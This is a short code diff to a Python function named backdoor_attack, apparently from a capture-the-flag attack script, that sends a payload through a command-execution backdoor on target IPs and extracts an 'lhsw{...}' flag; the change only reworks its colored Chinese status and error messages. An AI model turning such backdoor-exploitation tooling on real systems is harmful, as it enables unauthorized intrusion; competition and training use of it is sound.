@@ -12,9 +12,13 @@ def backdoor_attack(ip, url_path, method, payload):  # 命令执行漏洞
         # 正则匹配flag
         flag = re.search(r'lhsw\{.*\}', r.text).group()
         # 打印攻击结果
-        print('[FLAGS]'+ip+'>>>>>>'+flag)
-        return flag
+        if flag != '': 
+            print('\033[0;32m[获取目标FLAG]\033[0m'+ip+'-->'+flag)
+            return flag
+        else:
+            print('\033[0;33m[查找FLAG失败]\033[0m'+ip+'-->'+'未搜索到FLAG字符串！')
+            return False
 
     except Exception as e:
-        print('[ERROR]' + ip + '>>>>>>backdoor_attack()执行失败>>>>>>' + str(e))
+        print('\033[1;35m[后门攻击失败]\033[0m' + ip + '-->backdoor_attack()执行失败>>>>>>' + str(e))
         return False
